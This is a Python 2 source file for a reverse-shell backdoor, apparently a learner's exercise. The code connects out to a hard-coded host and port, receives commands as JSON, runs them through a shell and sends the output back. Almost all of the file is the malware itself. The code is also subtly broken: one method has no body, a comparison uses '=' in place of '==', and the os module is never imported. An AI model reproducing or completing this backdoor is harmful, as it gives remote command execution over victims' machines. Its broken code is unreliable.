import socket, json, sys, socket, subprocess
import re
import zlib
import linecache

class Backdoor:
	def __init__(self, ip, port):
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))

	def PrintException(self):
			exc_type, exc_obj, tb = sys.exc_info()
			f = tb.tb_frame
			lineno = tb.tb_lineno
			filename = f.f_code.co_filename
			linecache.checkcache(filename)
			line = linecache.getline(filename, lineno, f.f_globals)
			print 'EXCEPTION IN ({}, LINE {} "{}"): {}'.format(filename, lineno, line.strip(), exc_obj)


	def reliable_send(self, data):
		json_data = json.dumps(data) #wrap data in json format
		self.connection.send(json_data.encode())

	def reliable_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data.decode('latin1', errors='replace')) #unwrap json data
			except ValueError:
				continue

	def execute_system_command(self, command):
		return subprocess.check_output(command, shell=True)

	def change_working_diretory_to(self, path):
		os.chdir(path)
		return "[+] Changing working directory to " + path

	def read_file(self, path):
		


	def run(self):
		#self.connection.send("\n[+] Welcome to hell\n")
		while True:
			command = self.reliable_receive() # will wait for data to be sent so that it can be received, will get a broken pipe if file/ data is larger than this
			if command[0] == "exit":
				self.connection.close()
				exit()
			elif command[0] = "cd" and len(command) > 1:
				self.change_working_diretory_to(command[1])
			else:
				command_result = self.execute_system_command(command)
			self.reliable_send(command_result)
		#self.connection.close()
	
my_backdoor = Backdoor("192.168.1.144", 4444)
my_backdoor.run()